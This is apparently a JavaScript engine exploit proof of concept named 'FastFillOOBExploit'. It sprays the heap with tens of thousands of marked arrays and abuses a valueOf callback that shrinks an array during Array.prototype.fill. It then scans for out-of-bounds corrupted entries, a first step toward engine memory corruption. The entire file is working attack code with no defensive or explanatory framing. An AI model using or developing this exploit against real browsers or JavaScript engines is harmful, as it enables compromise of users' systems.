import { Int } from './int64.mjs';
import { die, log, clear_log, sleep, hex } from './utils.mjs';

class FastFillOOBExploit {
    constructor() {
        this.sprayedArrays = [];
        this.corruptedArrays = [];
        this.marker = 0x42424242;
    }

    async execute() {
        await this.arraySpray();
        await this.triggerOOB();
        await this.scanCorrupted();
        return this.corruptedArrays.length > 0;
    }

    async arraySpray() {
        for (let round = 0; round < 3; round++) {
            const arrays = [];
            for (let i = 0; i < 20000; i++) {
                const arr = new Array(1024);
                for (let j = 0; j < arr.length; j++) {
                    arr[j] = {
                        marker: this.marker,
                        index: i,
                        pos: j
                    };
                }
                arrays.push(arr);
            }
            this.sprayedArrays.push(...arrays);
            gc();
            await sleep(20);
        }
    }

    async triggerOOB() {
        const v0 = [];
        for (let i = 0; i < 50000; i++) {
            v0[i] = [];
        }
        
        const v10 = new Object(Object, v0);
        
        let shrunk = false;
        function shrink() {
            if (!shrunk) {
                v0.length = 100;
                shrunk = true;
                gc();
            }
            return 0;
        }
        
        const o14 = { valueOf: shrink };
        
        try {
            v0.fill(v10, o14);
        } catch (e) {}
        
        this.v0 = v0;
    }

    async scanCorrupted() {
        for (let i = 0; i < this.sprayedArrays.length; i++) {
            const arr = this.sprayedArrays[i];
            if (!arr) continue;

            for (let j = arr.length; j < arr.length + 50; j++) {
                if (arr[j] !== undefined && arr[j].marker === this.marker) {
                    this.corruptedArrays.push({
                        array: arr,
                        index: i,
                        oobIndex: j,
                        data: arr[j]
                    });
                }
            }

            if (i % 5000 === 0) await sleep(1);
        }
    }
}

async function main() {
    const exploit = new FastFillOOBExploit();
    const success = await exploit.execute();
    
    if (success) {
        log("Found " + exploit.corruptedArrays.length + " corrupted arrays");
        for (const corrupted of exploit.corruptedArrays) {
            log("Array " + corrupted.index + " OOB at " + corrupted.oobIndex);
        }
    } else {
        die("No corrupted arrays found");
    }
}

main();